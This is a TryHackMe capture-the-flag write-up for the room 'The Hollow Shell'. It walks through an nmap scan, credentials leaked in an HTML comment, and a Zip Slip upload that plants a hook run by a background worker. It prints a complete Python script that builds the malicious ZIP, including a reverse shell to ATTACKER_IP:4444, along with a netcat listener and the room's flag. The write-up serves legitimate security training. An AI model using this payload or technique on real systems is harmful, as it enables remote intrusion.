# 🌊 TryHackMe Writeup: The Hollow Shell

> **Room Category:** Web Exploitation
> 
> **Difficulty:** Medium
>  
> **Platform:** TryHackMe
> 
> **Objective:** Exploit a vulnerable file upload mechanism to gain Remote Code Execution (RCE) and capture the flag.

---

# 📖 Room Overview

## Introduction

Welcome to another **TryHackMe Hacker Holidays 2026** challenge! In this write-up, we'll explore **The Hollow Shell**, a web exploitation room focused on abusing an insecure ZIP upload mechanism. We'll walk through the complete attack chain—from initial enumeration and application analysis to exploiting a **Zip Slip** vulnerability, achieving **Remote Code Execution (RCE)** through the application's automated theme worker, and finally capturing the flag. Along the way, we'll explain the reasoning behind each step and the security concepts that make this attack possible.

---

# 🎯 Enumeration

## Nmap Scan

The first step was identifying the services exposed by the target.

```bash
nmap -sC -sV -A -p 22,5000 <TARGET_IP> -oN nmap.txt
```

### Result

```text
22/tcp    OpenSSH 9.6p1
5000/tcp  Gunicorn (Flask Application)
```

The scan revealed a Flask web application running on **port 5000**.

---

# 🔍 Inspecting the Web Application

After browsing to the application, I was presented with a login page.

Inspecting the HTML source revealed hardcoded credentials inside an HTML comment.

```text
Username: concierge
Password: StayNoticed2024!
```
<img width="655" height="309" alt="10sourcecode" src="https://github.com/user-attachments/assets/cf82f30c-72da-41e7-9705-badb6526f389" />


Using these credentials, I successfully logged into the staff dashboard.

The dashboard allowed staff members to upload a **Shell (.zip)** package used for the hotel's tablet themes.

One particular message stood out:

> *A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore.*

This hinted that uploaded content might eventually be processed by a background worker.
<img width="1120" height="815" alt="10loded" src="https://github.com/user-attachments/assets/959b72fb-3091-47ec-b1c1-759718012920" />

---

# 📂 Upload Requirements

The upload feature expected a ZIP archive containing a valid `shell.json` manifest.

```text
shell.zip
│
└── shell.json
```

As long as the manifest was valid, the upload was accepted.

---

# 💥 Crafting the Malicious ZIP

Since the application extracted every file inside the uploaded archive, I created a malicious ZIP file that abused **Zip Slip (Directory Traversal)** to write a Python script into the application's `hooks` directory.

First, I created the following Python script to generate the malicious archive.

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

After saving the script, I made it executable and generated the malicious ZIP archive.

```bash
chmod +x payload.py
python3 payload.py
```

This created:

```text
reverse-shell.zip
```

I then uploaded `reverse-shell.zip` through the application's upload functionality.

After a successful upload, the application returned the storage location.

```text
shells/22b7c883886f/
```
<img width="956" height="920" alt="10uploading" src="https://github.com/user-attachments/assets/368220bd-ac91-4d6b-a1ec-8e0eb5f4a518" />


Although the uploaded files were stored under the `shells/` directory, the directory traversal payload caused `callback.py` to be written into the application's `hooks/` directory.

The background **theme worker** continuously monitors this directory and automatically executes any Python hook it discovers.

---

# 📡 Reverse Shell

Before uploading the archive, I started a Netcat listener on my attack machine.

```bash
nc -lvnp 4444
```

Within a few moments, the background worker executed the uploaded hook and initiated a reverse shell connection.

```text
connect to [ATTACKER_IP] from [TARGET_IP]
```

This provided a shell on the target as the `roomservice` user.

```text
roomservice@tryhackme-2404:/var/www/conch$
```

This confirmed successful Remote Code Execution.

---

# 🏁 Capturing the Flag

After obtaining shell access, I navigated to the user's home directory.

```bash
cd /home/roomservice
```

Listing the files revealed the flag.

```bash
ls -la
```

```text
flag.txt
```

Reading the file returned the room flag.

```bash
cat flag.txt
```

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```



## 🔗 Attack Flow

```text
Nmap Scan
    │
    ▼
Discover Web Application (Port 5000)
    │
    ▼
Find Hidden Login Credentials
    │
    ▼
Login as Staff User
    │
    ▼
Analyze ZIP Upload Feature
    │
    ▼
Create Malicious ZIP File
    │
    ▼
Exploit Zip Slip Vulnerability
    │
    ▼
Write Python Hook into hooks/
    │
    ▼
theme_worker.py Executes the Hook
    │
    ▼
Gain Reverse Shell
    │
    ▼
Read flag.txt
    │
    ▼
Capture the Flag 🚩
```

---

## 📚 Key Concepts Learned

* Nmap Enumeration
* Source Code Analysis
* File Upload Vulnerabilities
* ZIP Archive Handling
* Zip Slip (Directory Traversal)
* Python Scripting
* Background Worker Execution
* Reverse Shell
* Remote Code Execution (RCE)
* Linux Enumeration

---

## 💡 Lessons Learned

This room showed how an insecure ZIP upload feature can lead to **Remote Code Execution**. Although the application checked the uploaded `shell.json` file,
it did not validate the file paths inside the ZIP archive. This allowed a **Zip Slip** attack to write a malicious Python script into the `hooks` directory,
where the background **theme worker** automatically executed it. The room also highlighted the importance of reviewing source code, understanding how 
background processes work, and identifying how multiple small weaknesses can combine into a full system compromise.
